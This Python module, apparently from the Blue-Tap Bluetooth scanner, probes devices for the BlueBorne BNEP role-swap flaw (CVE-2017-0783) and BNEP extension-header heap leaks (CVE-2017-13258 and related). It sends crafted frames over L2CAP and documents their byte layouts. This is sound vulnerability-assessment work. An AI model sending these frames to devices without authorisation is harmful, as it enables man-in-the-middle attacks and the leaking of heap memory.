"""BNEP CVE detection checks for Blue-Tap vulnerability scanner.

CVE-2017-0783: BNEP role swap accepted without validation (BlueBorne)
CVE-2017-13258/60/61/62: BNEP extension header heap information disclosure

Both checks connect to L2CAP PSM 0x000F (BNEP) and use crafted control frames
to probe whether the target stack enforces correct role validation and properly
bounds-checks extension header length fields.

Reference: https://armis.com/blueborne/
"""
from __future__ import annotations

import socket
import struct
import time

from blue_tap.modules.assessment.cve_framework import make_cve_finding as _finding

# AF_BLUETOOTH = 31 (Linux kernel constant, not exposed in Python's socket module)
AF_BLUETOOTH = 31
BTPROTO_L2CAP = 0

# BNEP runs on L2CAP PSM 0x000F (15)
PSM_BNEP = 0x000F

# BNEP packet type constants
BNEP_CONTROL = 0x01              # Control frame type byte
BNEP_GENERAL_ETHERNET = 0x00     # Data frame type (no MACs compressed)
BNEP_EXTENSION_FLAG = 0x80       # OR into type byte to signal extension headers follow

# BNEP control type constants (second byte of a control frame)
BNEP_SETUP_CONNECTION_REQ = 0x01
BNEP_SETUP_CONNECTION_RSP = 0x02

# BNEP Setup Connection Response codes (16-bit big-endian, bytes [3:5] of response)
SETUP_RSP_SUCCESS = 0x0000          # Connection accepted — target accepts the role mapping
SETUP_RSP_NOT_ALLOWED = 0x0001      # Connection refused — target rejected the swapped roles

# PAN profile UUIDs (UUID16, big-endian byte pairs)
UUID_PANU = 0x1115   # Personal Area Network User
UUID_NAP  = 0x1116   # Network Access Point
UUID_GN   = 0x1117   # Group Ad-hoc Network

# UUID16 hex strings for service-list matching (see _has_pan_service)
PAN_UUIDS = {"1115", "1116", "1117"}

# Socket timeout constants (seconds)
_CONNECT_TIMEOUT = 5.0
_RECV_TIMEOUT_SETUP = 3.0
_RECV_TIMEOUT_EXT = 1.0


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _has_pan_service(services: list[dict]) -> bool:
    """Return True if at least one PAN-related service UUID is in the service list.

    Matches UUID16 strings "1115" (PANU), "1116" (NAP), and "1117" (GN) as
    substrings of the UUID field so that both short-form and full SDP UUID
    representations are caught (e.g., "0000111600001000...").
    """
    for svc in services:
        uuid = str(svc.get("uuid", "")).lower().replace("-", "")
        if any(pan_uuid in uuid for pan_uuid in PAN_UUIDS):
            return True
    return False


def _l2cap_connect(address: str, psm: int, timeout: float) -> socket.socket:
    """Create a connected L2CAP SEQPACKET socket to (address, psm).

    Raises:
        OSError: if the connection fails for any reason.
    """
    # L2CAP SEQPACKET socket: AF_BLUETOOTH=31, SOCK_SEQPACKET, BTPROTO_L2CAP=0
    sock = socket.socket(AF_BLUETOOTH, socket.SOCK_SEQPACKET, BTPROTO_L2CAP)
    sock.settimeout(timeout)
    try:
        # L2CAP sockaddr: (bd_addr, psm) — PSM is the L2CAP channel number
        sock.connect((address, psm))
    except OSError:
        sock.close()
        raise
    return sock


def _recv_with_timeout(sock: socket.socket, bufsize: int, timeout: float) -> bytes | None:
    """Receive up to bufsize bytes with a per-call timeout.

    Returns None on timeout or any socket error — callers treat this as
    "no response" rather than a fatal failure.
    """
    sock.settimeout(timeout)
    try:
        return sock.recv(bufsize)
    except OSError:
        return None


# ---------------------------------------------------------------------------
# CVE-2017-0783 — BNEP Role Swap
# ---------------------------------------------------------------------------

def _check_bnep_role_swap(address: str, services: list[dict]) -> list[dict]:
    """Probe for CVE-2017-0783: BNEP Setup Connection Request with swapped roles.

    Vulnerable Android devices (pre-2017-09-01 patch) accept a BNEP setup where
    the source and destination UUIDs are deliberately reversed (attacker claims
    to be the NAP, connecting to PANU). A correctly patched stack rejects this
    with response code 0x0001 ("Connection Not Allowed").

    Attack packet layout::

        byte 0: 0x01  BNEP_CONTROL packet type
        byte 1: 0x01  control_type = SETUP_CONNECTION_REQUEST
        byte 2: 0x02  UUID size = 2 (UUID16)
        byte 3-4:  0x11 0x15  dst_uuid = PANU  ← swapped: attacker says "reach PANU"
        byte 5-6:  0x11 0x16  src_uuid = NAP   ← swapped: attacker claims to be NAP

    Expected (patched) response::

        byte 0: 0x01  BNEP_CONTROL
        byte 1: 0x02  SETUP_CONNECTION_RSP
        byte 2-3: 0x00 0x01  response_code = NOT_ALLOWED

    Args:
        address: Bluetooth device address (e.g., "AA:BB:CC:DD:EE:FF").
        services: Service list from browse_services(); each entry is a dict with
                  keys ``name``, ``uuid``, ``channel``, ``protocol``.

    Returns:
        A list containing one finding dict if the device is vulnerable, or an
        empty list if the stack correctly rejects the probe or PAN is absent.
    """
    if not _has_pan_service(services):
        # Target does not advertise any PAN profile service — skip probe
        return [_finding(
            "INFO", "CVE-2017-0783: Not Applicable",
            "BNEP role swap check skipped — target does not advertise PAN services "
            "(UUID 1115/1116/1117). Check only applies to devices exposing BNEP/PAN.",
            cve="CVE-2017-0783", status="not_applicable", confidence="high",
            evidence="No PAN UUID (1115/1116/1117) in SDP service list",
        )]

    # BNEP SETUP_CONNECTION_REQUEST with NAP and PANU roles deliberately swapped.
    # A naive stack that doesn't validate direction accepts this; a patched stack
    # rejects it with response_code=0x0001.
    #
    # Per BNEP spec (BT Core v5.4, Vol 3, Part F §3.1):
    #   - dst_uuid identifies the SERVICE on the target device (should be NAP/GN)
    #   - src_uuid identifies the SERVICE role the initiator claims (should be PANU)
    # Swapping these is the CVE-2017-0783 attack surface.
    swapped_setup = bytes([
        BNEP_CONTROL,           # 0x01: BNEP Control packet type
        BNEP_SETUP_CONNECTION_REQ,  # 0x01: Setup Connection Request
        0x02,                   # UUID size field = 2 bytes each (UUID16)
        0x11, 0x15,             # dst_uuid = PANU (0x1115) ← wrong: NAP should be dst
        0x11, 0x16,             # src_uuid = NAP  (0x1116) ← wrong: PANU should be src
    ])

    try:
        sock = _l2cap_connect(address, PSM_BNEP, _CONNECT_TIMEOUT)
    except OSError:
        # PSM 0x000F not reachable — PAN service is not actually accessible
        return []

    try:
        sock.send(swapped_setup)
        response = _recv_with_timeout(sock, 256, _RECV_TIMEOUT_SETUP)
    finally:
        sock.close()

    if response is None:
        # No response received but connection succeeded — the stack silently
        # accepted the setup without sending a rejection.  Treat as VULNERABLE.
        return [
            _finding(
                "HIGH",
                "BNEP Role Swap Accepted (CVE-2017-0783)",
                (
                    "The target accepted a BNEP Setup Connection Request with swapped "
                    "NAP/PANU roles without sending a rejection response. This is the "
                    "BlueBorne PAN attack vector (CVE-2017-0783)."
                ),
                cve="CVE-2017-0783",
                impact=(
                    "BlueBorne PAN attack vector — attacker can force MITM as NAP bridge"
                ),
                remediation="Apply Android security patch 2017-09-01 or update BlueZ",
                status="confirmed",
                confidence="high",
                evidence="BNEP SETUP_CONN_RSP: no rejection received (silent accept)",
            )
        ]

    # Parse the BNEP control response.
    # Expected layout of a SETUP_CONNECTION_RSP:
    #   byte 0: BNEP_CONTROL (0x01)
    #   byte 1: SETUP_CONNECTION_RSP (0x02)
    #   byte 2-3: (padding / reserved in some implementations, may be absent)
    #   bytes 3:5 or 2:4: response code big-endian uint16
    #
    # We check bytes [1] and [2] for the control type, then extract the
    # response code from the next two bytes.  Handle both 4-byte and 5-byte
    # layouts defensively.
    if len(response) < 4:
        # Too short to parse — cannot determine if role swap was accepted or rejected
        return []

    # Check that this is indeed a BNEP CONTROL / SETUP_CONNECTION_RSP frame
    if response[0] != BNEP_CONTROL or response[1] != BNEP_SETUP_CONNECTION_RSP:
        # Unexpected frame type — not a definitive acceptance; inconclusive
        return []

    # Extract the 16-bit response code.  The spec places it at bytes [2:4]
    # (immediately after the control type byte, no padding).
    response_code = struct.unpack_from(">H", response, 2)[0]

    if response_code == SETUP_RSP_SUCCESS:
        # 0x0000 = "Success" — stack accepted the swapped-role setup → VULNERABLE
        return [
            _finding(
                "HIGH",
                "BNEP Role Swap Accepted (CVE-2017-0783)",
                (
                    "The target responded with response_code=0x0000 (Success) to a "
                    "BNEP Setup Connection Request with deliberately swapped NAP/PANU "
                    "roles. This indicates CVE-2017-0783 is present."
                ),
                cve="CVE-2017-0783",
                impact=(
                    "BlueBorne PAN attack vector — attacker can force MITM as NAP bridge"
                ),
                remediation="Apply Android security patch 2017-09-01 or update BlueZ",
                status="confirmed",
                confidence="high",
                evidence=f"BNEP SETUP_CONN_RSP response_code=0x{response_code:04X}",
            )
        ]

    # Any non-zero response code (notably 0x0001 = "Connection Not Allowed")
    # means the stack correctly rejected the swapped-role request → PATCHED.
    return []


# ---------------------------------------------------------------------------
# CVE-2017-13258/13260/13261/13262 — BNEP Extension Header Heap Oracle
# ---------------------------------------------------------------------------

def _check_bnep_heap_oracle(address: str, services: list[dict]) -> list[dict]:
    """Probe for CVE-2017-13258/13260/13261/13262: BNEP extension header OOB read.

    Vulnerable Android Bluetooth stacks (pre-2018-01-01 patch) fail to validate
    the extension header ``length`` field against the actual remaining bytes in the
    L2CAP payload.  Sending a BNEP General Ethernet frame with the extension flag
    set and a ``length`` value larger than the available extension data causes the
    stack to read beyond the packet buffer, leaking heap memory back to the sender.

    Probe strategy:
      1. Establish a BNEP session (PANU→NAP, or PANU→PANU as fallback).
      2. Send 3 BNEP_GENERAL_ETHERNET frames (extension bit set) with ext_len
         values 4, 8, and 12 while supplying only 2 bytes of actual extension data.
      3. Collect any bytes returned by the target after each frame.
      4. Compare response bytes from probe 1 vs probe 3.  If any byte at the same
         offset is non-zero AND differs between the two probes, the target is
         leaking varying heap data → VULNERABLE.  Stable all-zero responses
         indicate the stack is patched or simply not responding.

    Extension header layout when extension flag is set (bit 7 of type byte)::

        type byte: 0x80  BNEP_GENERAL_ETHERNET | BNEP_EXTENSION_FLAG
        dst_mac (6 bytes)
        src_mac (6 bytes)
        ethertype (2 bytes, big-endian)
        ext_type (1 byte): bit 7=0 means no more extensions
        ext_len  (1 byte): DECLARED size of ext_data — set > actual bytes provided
        ext_data (N bytes): only 2 bytes provided regardless of ext_len

    Args:
        address: Bluetooth device address.
        services: Service list from browse_services().

    Returns:
        A list containing one finding dict if heap jitter is detected, or empty.
    """
    if not _has_pan_service(services):
        return [_finding(
            "INFO", "CVE-2017-13258: Not Applicable",
            "BNEP heap oracle check skipped — target does not advertise PAN services "
            "(UUID 1115/1116/1117). Check only applies to devices exposing BNEP/PAN.",
            cve="CVE-2017-13258,CVE-2017-13260,CVE-2017-13261,CVE-2017-13262",
            status="not_applicable", confidence="high",
            evidence="No PAN UUID (1115/1116/1117) in SDP service list",
        )]

    try:
        sock = _l2cap_connect(address, PSM_BNEP, _CONNECT_TIMEOUT)
    except OSError:
        return []

    try:
        return _run_heap_oracle_probe(sock, address)
    finally:
        sock.close()


def _run_heap_oracle_probe(sock: socket.socket, address: str) -> list[dict]:
    """Inner probe logic for the heap oracle check (called with an open socket).

    Separated from _check_bnep_heap_oracle so the finally-close always fires
    even when this function raises.

    Returns:
        Finding list (possibly empty).
    """
    # ------------------------------------------------------------------
    # Step 1: Establish a BNEP session so the stack processes our frames.
    #
    # Try PANU (attacker) → NAP (target) first — the normal client setup.
    # If the target rejects it (e.g., it is a PANU itself), fall back to
    # PANU→PANU.  We don't need the session to be fully functional; we just
    # need the stack to have processed at least one setup frame so it enters
    # the data-path state that parses extension headers.
    # ------------------------------------------------------------------

    # PANU (src=0x1115) connecting to NAP (dst=0x1116) — correct direction
    setup_panu_to_nap = bytes([
        BNEP_CONTROL,                # 0x01: BNEP Control type
        BNEP_SETUP_CONNECTION_REQ,   # 0x01: Setup Connection Request
        0x02,                        # UUID size = 2 bytes each (UUID16)
        0x11, 0x16,                  # dst_uuid = NAP  (0x1116)
        0x11, 0x15,                  # src_uuid = PANU (0x1115)
    ])

    # PANU→PANU fallback (used if target is not a NAP)
    setup_panu_to_panu = bytes([
        BNEP_CONTROL,
        BNEP_SETUP_CONNECTION_REQ,
        0x02,
        0x11, 0x15,  # dst_uuid = PANU (0x1115)
        0x11, 0x15,  # src_uuid = PANU (0x1115)
    ])

    session_established = False
    for setup_msg in (setup_panu_to_nap, setup_panu_to_panu):
        try:
            sock.send(setup_msg)
        except OSError:
            return []

        rsp = _recv_with_timeout(sock, 256, _RECV_TIMEOUT_SETUP)
        if rsp is not None and len(rsp) >= 4:
            # Check for SETUP_CONNECTION_RSP with success code
            if (rsp[0] == BNEP_CONTROL
                    and rsp[1] == BNEP_SETUP_CONNECTION_RSP):
                code = struct.unpack_from(">H", rsp, 2)[0]
                if code == SETUP_RSP_SUCCESS:
                    session_established = True
                    break
        # No success response — try the next setup variant

    # Continue even without confirmed session establishment: some stacks process
    # data frames regardless of whether setup completed cleanly.

    # ------------------------------------------------------------------
    # Step 2: Send 3 BNEP General Ethernet frames with under-supplied
    # extension data and collect any leak bytes from the target.
    #
    # Frame layout:
    #   type    (1 byte): 0x80 = GENERAL_ETHERNET | EXTENSION_FLAG
    #   dst_mac (6 bytes): broadcast ff:ff:ff:ff:ff:ff
    #   src_mac (6 bytes): crafted attacker MAC 00:11:22:33:44:55
    #   ethertype (2 bytes big-endian): 0x0800 (IPv4)
    #   ext_type  (1 byte): 0x00 — extension type 0, no-more-extensions (bit7=0)
    #   ext_len   (1 byte): DECLARED extension data length (4, 8, or 12)
    #   ext_data  (2 bytes): only 2 bytes actually provided
    #
    # The discrepancy between ext_len and the 2 bytes provided is the oracle:
    # a vulnerable stack reads ext_len bytes starting at ext_data, pulling in
    # heap bytes beyond the packet buffer and echoing them back (e.g., in an
    # error response or filter response).
    # ------------------------------------------------------------------

    dst_mac    = bytes([0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF])  # broadcast
    src_mac    = bytes([0x00, 0x11, 0x22, 0x33, 0x44, 0x55])  # attacker MAC
    ethertype  = bytes([0x08, 0x00])                           # IPv4
    ext_type   = bytes([0x00])   # type=0x00, bit7=0 → no more extensions
    ext_data   = bytes([0x00, 0x00])  # only 2 bytes regardless of declared length

    probe_lens = [4, 8, 12]   # declared ext_len values — all larger than 2
    responses: list[bytes] = []

    for probe_len in probe_lens:
        ext_len = bytes([probe_len])  # declared size > actual data provided

        frame = (
            bytes([BNEP_GENERAL_ETHERNET | BNEP_EXTENSION_FLAG])  # 0x80
            + dst_mac
            + src_mac
            + ethertype
            + ext_type
            + ext_len
            + ext_data  # 2 bytes — leaves (probe_len - 2) bytes under-supplied
        )

        try:
            sock.send(frame)
        except OSError:
            # Socket broke mid-probe — treat as inconclusive
            responses.append(b"")
            continue

        rsp = _recv_with_timeout(sock, 256, _RECV_TIMEOUT_EXT)
        responses.append(rsp if rsp is not None else b"")

    # ------------------------------------------------------------------
    # Step 3: Jitter analysis.
    #
    # Compare probe 1 (ext_len=4) vs probe 3 (ext_len=12) byte-by-byte.
    # If any byte at the same offset is:
    #   - non-zero in at least one response, AND
    #   - different between the two responses
    # then the stack returned varying non-zero data — characteristic of
    # heap memory being echoed back with different content each probe.
    # Stable all-zero or identical responses indicate no leak.
    # ------------------------------------------------------------------

    r1 = responses[0]
    r3 = responses[2]
    compare_len = min(len(r1), len(r3))

    jitter_offset: int | None = None
    for i in range(compare_len):
        b1 = r1[i]
        b3 = r3[i]
        if b1 != b3 and b1 != 0x00 and b3 != 0x00:
            jitter_offset = i
            break

    if jitter_offset is not None:
        evidence = (
            f"Extension header response bytes vary across 3 probes "
            f"(jitter detected at offset {jitter_offset}): "
            f"probe1[{jitter_offset}]=0x{r1[jitter_offset]:02X} "
            f"probe3[{jitter_offset}]=0x{r3[jitter_offset]:02X}"
        )
        return [
            _finding(
                "HIGH",
                "BNEP Heap Information Disclosure (CVE-2017-13258)",
                (
                    "The target returns varying non-zero bytes in response to BNEP "
                    "General Ethernet frames with an extension header length field "
                    "larger than the actual extension data provided. This indicates "
                    "an out-of-bounds heap read (CVE-2017-13258/13260/13261/13262)."
                ),
                cve="CVE-2017-13258,CVE-2017-13260,CVE-2017-13261,CVE-2017-13262",
                impact=(
                    "Heap memory contents disclosed to attacker — may contain "
                    "addresses, keys, or other sensitive data"
                ),
                remediation="Apply Android security patch 2018-01-01",
                status="confirmed",
                confidence="high",
                evidence=evidence,
            )
        ]

    # No jitter detected — either patched or stack did not respond to data frames
    return []
